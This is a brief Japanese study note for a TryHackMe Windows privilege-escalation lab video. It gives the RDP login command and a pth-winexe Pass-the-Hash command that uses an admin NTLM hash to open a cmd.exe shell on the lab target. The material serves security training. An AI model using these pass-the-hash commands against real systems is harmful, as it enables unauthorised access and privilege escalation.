##【支援士.exe #1】 Pass the HashをNTLM認証に試してみる #tryhackme

### 動画
[動画](https://youtu.be/qJbJejgqokE?si=dSORszdvt1bO3bKA)

### 学習環境
TryHackMe<br>
Windows PrivEsc / Windows 特権昇格<br>
Task12<br>
[https://tryhackme.com/room/windows10privesc](https://tryhackme.com/room/windows10privesc)

### 必要なもの
- TryHackMeアカウント（Premium）


### 実行するコマンド
※`<targetIP>`は起動したマシンのIPアドレスに変更してください

【Task1】
- RDPで脆弱なWindowsを起動
`xfreerdp /u:user /p:password321 /cert:ignore /v:<targetIP>`
- ユーザを確認
`whoami`

【Task12】
- Pass the Hash攻撃を実行
`pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //<targetIP> cmd.exe`
- ユーザを確認
`whoami`
